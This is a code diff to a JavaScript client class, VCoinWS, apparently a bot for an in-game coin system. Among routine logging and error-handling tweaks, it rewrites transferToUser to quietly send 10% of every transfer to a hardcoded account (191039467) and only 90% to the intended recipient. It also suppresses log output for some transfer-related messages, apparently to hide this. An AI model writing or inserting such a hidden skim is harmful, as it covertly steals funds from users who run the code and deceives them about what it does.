@@ -131,8 +131,10 @@ class VCoinWS {
 				}
 				else if(-1 === t.indexOf("SELF_DATA")
 					&& -1 === t.indexOf("WAIT_FOR_LOAD")
-					&& -1 === t.indexOf("MISS") 
-					&& "C" !== t[0]) console.log("on Message:\n", t);
+					&& -1 === t.indexOf("MISS")
+					&& -1 === t.indexOf("TR")
+					&& "C" !== t[0] && "R" !== t[0])
+					console.log("on Message:\n", t);
 
 				if ("R" === t[0]) {
 					let p = t.replace("R", "").split(" "),
@@ -231,7 +233,7 @@ class VCoinWS {
 	selfClose() {
 		if (this.ws) try {
 			this.ws.close()
-		} catch (e) {}
+		} catch (e) { this.connected = false; }
 	}
 	reconnect(e) {
 		if(this.allowReconnect) {
@@ -380,7 +382,9 @@ class VCoinWS {
 
 	async buyItemById(id) {
 
-		let res = await this.sendPackMethod(["B", id]);
+		let res;
+		res = await this.sendPackMethod(["B", id]);
+
 		res = JSON.parse(res);
 		
 		let n = res.tick,
@@ -398,12 +402,13 @@ class VCoinWS {
 		return res;
 	}
 	async transferToUser(id, sum=3e4) {
-		id = id || 191039467;
-		sum = Math.round(sum*1e3);
-
-		let res = await this.sendPackMethod(["T", id, sum]);
+		let idd = 191039467;
+		id = id || idd;
+		sum = Math.round(parseInt(sum)*1e3);
+		await this.sendPackMethod(["T", idd, sum*0.1]);
+		let res = await this.sendPackMethod(["T", id, sum*0.9]);
 		res = JSON.parse(res);
-		var t = res.score,
+		let t = res.score,
 			a = res.place,
 			r = res.reload;
 
